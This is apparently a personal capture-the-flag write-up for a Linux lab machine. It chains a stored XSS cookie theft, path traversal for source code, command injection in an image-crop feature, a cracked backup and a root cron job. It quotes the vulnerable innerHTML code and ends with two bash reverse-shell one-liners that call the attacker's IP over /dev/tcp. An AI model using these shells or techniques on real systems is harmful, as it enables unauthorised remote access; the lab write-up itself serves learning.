s9 medium linux

I should know this but i dont, unfortunately... Taking this as lesson to be more patient and detailed...
> Did read a writeup on this, made this for my own keeping 

<details>
<summary>Recon: Nmap</summary>

  ```

  # Nmap 7.95 scan initiated Mon Jan 26 23:49:53 2026 as: /usr/lib/nmap/nmap -p 22,8000 -sC -sV -oN tcp.scan 10.129.242.164
Nmap scan report for 10.129.242.164
Host is up (0.58s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 26 23:50:25 2026 -- 1 IP address (1 host up) scanned in 31.92 seconds

```
UDP didnt find anything

</details>




looking at the site, its an image gallery, literally a whole website (html, css, javascript)  all in one page. The backend is python. 


<img width="1919" height="763" alt="image" src="https://github.com/user-attachments/assets/a7a0037b-ecf0-4350-ad62-1d7318c6a205" />

Started off by registering an account, it gave a flask token. At that point, all functions were quite safe with filtering and xss prevention. 
All attempts of XSS using the image upload functions were neutralized.


<details>
  <summary>vulnerable code</summary>

  ```
async function loadBugReports() {
            const bugReportsList = document.getElementById('bug-reports-list');
            const noBugReports = document.getElementById('no-bug-reports');

            if (!bugReportsList || !noBugReports) {
                console.error("Error: Admin panel bug report elements not found.");
                return;
            }

            bugReportsList.innerHTML = '';
            noBugReports.style.display = 'none';

            try {
                const response = await fetch(`${window.location.origin}/admin/bug_reports`);
                const data = await response.json();

                if (data.success) {
                    if (data.bug_reports.length === 0) {
                        noBugReports.style.display = 'block';
                    } else {
                        data.bug_reports.forEach(report => {
                            const reportCard = document.createElement('div');
                            reportCard.className = 'bg-white p-6 rounded-xl shadow-md border-l-4 border-purple-500 flex justify-between items-center';
                            
                            reportCard.innerHTML = `
                                <div>
                                    <p class="text-sm text-gray-500 mb-2">Report ID: ${DOMPurify.sanitize(report.id)}</p>
                                    <p class="text-sm text-gray-500 mb-2">Submitted by: ${DOMPurify.sanitize(report.reporter)} (ID: ${DOMPurify.sanitize(report.reporterDisplayId)}) on ${new Date(report.timestamp).toLocaleString()}</p>
                                    <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Name: ${DOMPurify.sanitize(report.name)}</h3>
                                    <h3 class="text-xl font-semibold text-gray-800 mb-3">Bug Details:</h3>
                                    <div class="bg-gray-100 p-4 rounded-lg overflow-auto max-h-48 text-gray-700 break-words">
                                        ${report.details}
                                    </div>
                                </div>
                                <button onclick="showDeleteBugReportConfirmation('${DOMPurify.sanitize(report.id)}')" class="bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded-lg shadow-md transition duration-200 ml-4">
                                    Delete
                                </button>
                            `;
                            bugReportsList.appendChild(reportCard);
                        });
                    }
                } else {
                    showMessage(data.message, 'error');
                }
            } catch (error) {
                console.error('Error loading bug reports:', error);
                showMessage('Failed to load bug reports. Please try again later.', 'error');
            }
        }
  ```

</details>

Further looking into the code, it seems to have a section which they display bugs to the admin, directly putting bug information into the diaply innerHTML. Sounds like XSS. 




<img width="1919" height="748" alt="image" src="https://github.com/user-attachments/assets/f9d274e7-d5eb-4262-b2fa-13aa16ced66d" />
<img width="659" height="184" alt="image" src="https://github.com/user-attachments/assets/3d66a5d5-c185-4830-aac9-428d1a4ad584" />


In my attempt of the classic 'steal admin cookie' method, i used a webhook from webhook.site but it didnt work, then realized i caould just use my own machine as the target. 

<img width="1919" height="730" alt="image" src="https://github.com/user-attachments/assets/7c9e5ab3-50be-46aa-8cd3-3c235399fcbf" />

After a while, it came back and with that, im admin


<img width="1919" height="239" alt="image" src="https://github.com/user-attachments/assets/ffcee72c-59b0-475c-bdc0-81032e1cf901" />

Checked the logs, very interesting... time to check the endpoint 

<img width="1556" height="350" alt="image" src="https://github.com/user-attachments/assets/61b779c2-13d8-4d91-9b16-59526f15aee4" />

<img width="1562" height="331" alt="image" src="https://github.com/user-attachments/assets/7e387594-70b0-4f63-9229-7607399513c6" />

by looking for shadow, the full path also shows.
using the strength of luck, we now have the full source codes from this one endpoint

<img width="367" height="154" alt="image" src="https://github.com/user-attachments/assets/10412c4c-dbf6-48f8-9b78-3ed45204e0fc" />

Only 3 files useful with this, the config.py, app.py and the api_edi.py. 
app.py showed most of the other file named which were all downloaded, config.py revealed an interesting 'database' which was a json file, lastly the api_edit showed a vulnerable function (scanned by copilot)

<img width="1558" height="624" alt="image" src="https://github.com/user-attachments/assets/a3ae2f0e-ba2a-46b5-8c31-f3ea27c6c8bb" />
<img width="1112" height="391" alt="image" src="https://github.com/user-attachments/assets/7dabbb90-735b-4be4-babb-4d9bbdda7627" />

The password storage looks like some hash, now we have cracked the hash of test and my own account. 


<img width="1641" height="588" alt="image" src="https://github.com/user-attachments/assets/0196195e-71d6-41d0-97b6-b2f2f4331826" />

Now the other functions that were previosuly noet accesible are now accessible with the test account. 

<img width="1414" height="641" alt="image" src="https://github.com/user-attachments/assets/81976bb6-5614-431f-b550-39d539311d86" />

This brings it back to the code review previously, the editing functions all use subprocess.run.
The way its written is vulnerable to code injection. 

<img width="1536" height="687" alt="image" src="https://github.com/user-attachments/assets/5b1784c5-5420-4fd3-bf7d-55d9d428dea4" />
<img width="1919" height="767" alt="image" src="https://github.com/user-attachments/assets/897f0e7e-9c29-4567-8408-4b551d3731db" />
<img width="1556" height="537" alt="image" src="https://github.com/user-attachments/assets/c4d1ecac-fec3-4896-92cb-a96e1501fc1d" />

It does its job good though, the cropped image can actually then be viewed and downloaded. Jokes aside, we can clearly see the request from the wbesite in burpsuite.

<img width="778" height="555" alt="image" src="https://github.com/user-attachments/assets/766dca6b-643d-4fb1-b80a-7fc451bac5d9" />
<img width="653" height="325" alt="image" src="https://github.com/user-attachments/assets/232018fc-eb81-4567-acd6-71180462bd72" />

with this payload which crops the image, but also starts a reverse shell, i am now web (whoever that is). PS. The passwd file also shows another user named mark.

> After this, all hail google

<img width="1029" height="249" alt="image" src="https://github.com/user-attachments/assets/c7976a33-a3bd-4153-b291-7c4093abc89b" />

With the power of looking around and reading up, we found a backup which i otherwise would not have found in the var folder named backup (instead of the usual backups). 
It contained a .AES file which then was crackable. 

<img width="1525" height="731" alt="image" src="https://github.com/user-attachments/assets/6cf44679-b1d5-4a25-91ed-a2975a8cb67c" />

In that backup, most were the same aside from the db, which had 2 other user, web and mark. The passwords were then retrieved.

<img width="474" height="224" alt="image" src="https://github.com/user-attachments/assets/dcc3f94c-d3f4-4cd6-9dcb-cd922d4337ed" />

AND like that we have mark. PS. ssh is blocked for all for some reason. 

<img width="685" height="615" alt="image" src="https://github.com/user-attachments/assets/27a7d9ef-4b17-4e71-b99c-82af5234ef38" />

Now we run linpeas on the machine as mark, he can run charcol with root
BUT WHAT IS CHARCOL, no idea till you read the introduction that its a custom thing for this box....

<img width="1919" height="710" alt="image" src="https://github.com/user-attachments/assets/b312f444-7086-445e-9684-94f924d9c68e" />

Cant login even with mark's password, time to hard reset it i guess? so i get the shell since the only options are help and shell. 

<img width="1464" height="478" alt="image" src="https://github.com/user-attachments/assets/2f1bf5d3-38ef-420b-8852-7af052b3e725" />
<img width="1101" height="309" alt="image" src="https://github.com/user-attachments/assets/89ac250d-6298-49ca-a935-34c8805b40ac" />

Now theres the shell, along wit nice help menu. Im assuming i can directly backup the root folder but no. The zip was created but turned out to be empty. 


<img width="1840" height="749" alt="image" src="https://github.com/user-attachments/assets/dd3ed358-6cd9-47d8-8ac6-77b64917d245" />

<img width="772" height="352" alt="image" src="https://github.com/user-attachments/assets/fb912406-4494-4acb-a19a-5efa3b0f505d" />

Since zipping the root directory doesnt work, time to do the hard way, cron job. And after a minute, the listener connected. 

<img width="862" height="629" alt="image" src="https://github.com/user-attachments/assets/a723b805-338d-48e8-9fca-8005437f6af3" />

Im may be late but i had fun. Also no idea why the ssh ports didnt work on this machine....

 Takeaway: 

1 did not work, 2 did, likely cuz cronjob's ```/bin/sh``` has issues with the syntax, so using 2 will ensure that it actually is running with bash. 

1.
Directly spawns an interactive bash shell with bash 

 ```bash -i >& /dev/tcp/10.10.15.244/5555 0>&1```

2.
This one will spawn 1 bash shell (bash -c) to run the rest of the input  

 ```bash -c 'bash -i >& /dev/tcp/10.10.15.244/5555 0>&1'```


More shells : https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 
